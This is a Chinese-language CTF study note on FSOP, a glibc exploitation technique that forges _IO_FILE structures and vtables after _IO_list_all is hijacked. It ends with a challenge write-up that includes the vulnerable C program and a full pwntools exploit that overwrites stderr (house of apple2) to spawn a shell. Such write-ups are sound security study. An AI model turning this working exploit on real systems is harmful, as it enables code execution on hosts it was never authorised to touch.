---
title: FSOP
date: '2025-05-25 23:26:19'
updated: '2025-12-11 17:26:55'
---
FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 FILE 的介绍得知进程内所有的_IO_FILE 结构会使用_chain 域相互连接形成一个链表，这个链表的<font style="background-color:#FBDE28;">头部</font>由_IO_list_all 维护

FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用vtable 中的_IO_overflow



![](/images/f0d9939de704cfac6ffc426f67e48863.jpeg)

而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：

1. 当 libc 执行 abort 流程时
2. 当执行 exit 函数时
3. 当执行流从 main 函数返回时

示例 ：

获知 libc.so 基址，因为_IO_list_all 是作为全局变量储存在 libc.so 中的，不泄漏 libc 基址就不能改写_IO_list_all。

之后需要用任意地址写把_IO_list_all 的内容改为指向我们可控内存的指针，

之后的问题是在可控内存中布置什么数据，毫无疑问的是需要布置一个我们理想函数的 vtable 指针。但是为了能够让我们构造的 fake_FILE 能够正常工作，还需要布置一些其他数据

这里的依据是_IO_flush_all_lockp 源码：

```python
if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)) && _IO_OVERFLOW (fp, EOF) == EOF)
{
	result = EOF;
}
```

也就是

```python
fp->_mode <= 0
fp->_IO_write_ptr > fp->_IO_write_base
```

后面就是伪造 vtable 把里面的`_IO_overflow`劫持成要的地址



FSOP 实际上就是利用 IO 函数调用链和函数虚表来劫持程序流的手法

# MiniVN 2025 自由的奶龙
真没想到签到题整个 FSOP，是我视野狭隘了

```c
#include <stdio.h>
#include <unistd.h>

int main(){
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    printf("I give you soemthing nice! Here: %p\n", &read);
    unsigned long addr;
    scanf("%lu", &addr);
    printf("%lx\n", addr);
    puts("write your words!");
    read(0, (void *)addr, 0x100);
}
```

这里是给了一个 2.35 版本的任意地址写，但是在 read 之后就直接 main 函数返回了

没有了 exit_hook，在 read 之后也没有调用到 libc 的一些 got 表函数没法劫持 glibcgot 表，

没想到是直接劫持 glibc 里面的 _IO_list_all 指向的 IO_file 结构体 stderr

套个 house of apple2 的板子就直接出了

```python
#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

# link=remote('challenge.ilovectf.cn',30810)
link=process('./qiandao')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

gdb.attach(link,'b *$rebase(0x0000000000012E0)')
pause()

link.recvuntil(b'Here: ')
read_addr=int(link.recv(14),16)
# success('read_addr: '+hex(read_addr))

libc_base=read_addr-0x114840
success('libc_base: '+hex(libc_base))
stderr=libc_base+0x21b6a0

fake_file = flat({
    0x0: b'  sh'.ljust(8,b'\x00'),
    0x20: p64(0), #write_base=0
    0x28: p64(1), #write_ptr>write_base
    0x38: p64(0), #buf_base=0 
    0x68: p64(libc_base+libc.symbols['system']), #_wide_vtable->doallocate=system
    0xa0: p64(stderr), #_wide_data=chunk0_addr
    0xd8: p64(libc_base + libc.symbols['_IO_wfile_jumps']), #vtable
    0xe0: p64(stderr) #_wide_vtable
}, filler=b"\x00")

link.sendline(str(stderr))
link.send(fake_file)

link.interactive()
```

